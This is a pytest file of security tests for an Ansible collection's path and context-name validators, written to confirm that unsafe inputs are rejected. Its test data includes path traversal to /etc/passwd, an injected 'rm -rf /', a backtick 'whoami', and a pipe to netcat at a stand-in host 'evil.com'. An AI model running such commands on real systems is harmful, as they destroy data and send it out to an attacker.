"""Security-negative tests for validation.py utilities."""

import pytest

from ansible_collections.tomazb.acm_switchover.plugins.module_utils.validation import (
    CONTEXT_NAME_MAX_LENGTH,
    ValidationError,
    validate_context_name,
    validate_safe_path,
)


class TestValidateContextNameNegative:
    """Negative tests for validate_context_name security checks."""

    def test_rejects_empty_context(self):
        with pytest.raises(ValidationError, match="cannot be empty"):
            validate_context_name("")

    def test_rejects_overlong_context(self):
        overlong = "a" * (CONTEXT_NAME_MAX_LENGTH + 1)
        with pytest.raises(ValidationError, match="exceeds maximum length"):
            validate_context_name(overlong)

    def test_rejects_context_starting_with_hyphen(self):
        with pytest.raises(ValidationError, match="Invalid context name"):
            validate_context_name("-invalid-context")

    def test_rejects_context_ending_with_special(self):
        with pytest.raises(ValidationError, match="Invalid context name"):
            validate_context_name("invalid-context-")

    def test_rejects_context_with_spaces(self):
        with pytest.raises(ValidationError, match="Invalid context name"):
            validate_context_name("invalid context")


class TestValidateSafePathNegative:
    """Negative tests for validate_safe_path security checks."""

    def test_rejects_path_traversal_double_dot(self):
        with pytest.raises(ValidationError, match="Path traversal attempt"):
            validate_safe_path("../etc/passwd")

    def test_rejects_path_traversal_in_middle(self):
        with pytest.raises(ValidationError, match="Path traversal attempt"):
            validate_safe_path("/var/data/../etc/passwd")

    def test_rejects_path_with_shell_command_injection(self):
        with pytest.raises(ValidationError, match="unsafe characters"):
            validate_safe_path("/data;rm -rf /")

    def test_rejects_path_with_backtick_injection(self):
        with pytest.raises(ValidationError, match="unsafe characters"):
            validate_safe_path("/path/`whoami`")

    def test_rejects_path_with_dollar_expansion(self):
        with pytest.raises(ValidationError, match="unsafe characters"):
            validate_safe_path("/path/$HOME")

    def test_rejects_path_with_pipe_injection(self):
        with pytest.raises(ValidationError, match="unsafe characters"):
            validate_safe_path("/path/file | nc evil.com 9999")

    def test_rejects_empty_path(self):
        with pytest.raises(ValidationError, match="cannot be empty"):
            validate_safe_path("")


class TestValidateContextNamePositive:
    """Positive tests to ensure valid contexts still pass."""

    def test_accepts_simple_context(self):
        validate_context_name("my-cluster")  # should not raise

    def test_accepts_context_with_dots(self):
        validate_context_name("my.cluster.name")

    def test_accepts_context_with_colons(self):
        validate_context_name("context:v1:admin")

    def test_accepts_context_with_at_and_slash(self):
        validate_context_name("user@cluster/name")

    def test_accepts_single_character_context(self):
        validate_context_name("a")

    def test_accepts_max_length_context(self):
        validate_context_name("a" * CONTEXT_NAME_MAX_LENGTH)


class TestValidateSafePathPositive:
    """Positive tests to ensure valid paths still pass."""

    def test_accepts_simple_path(self):
        validate_safe_path("/var/data")  # should not raise

    def test_accepts_path_with_dots(self):
        validate_safe_path("/var/data/file.txt")

    def test_accepts_relative_path(self):
        validate_safe_path("./state/checkpoint.json")

    def test_accepts_single_dot(self):
        validate_safe_path("./file")

    def test_accepts_home_relative_kubeconfig(self):
        validate_safe_path("~/.kube/config")  # should not raise

    def test_accepts_home_relative_nested(self):
        validate_safe_path("~/projects/kubeconfigs/cluster.yaml")  # should not raise

    def test_rejects_mid_path_tilde(self):
        with pytest.raises(ValidationError, match="unsafe characters"):
            validate_safe_path("/path/file~backup")

    def test_rejects_tilde_without_slash(self):
        with pytest.raises(ValidationError, match="unsafe characters"):
            validate_safe_path("~etc/passwd")
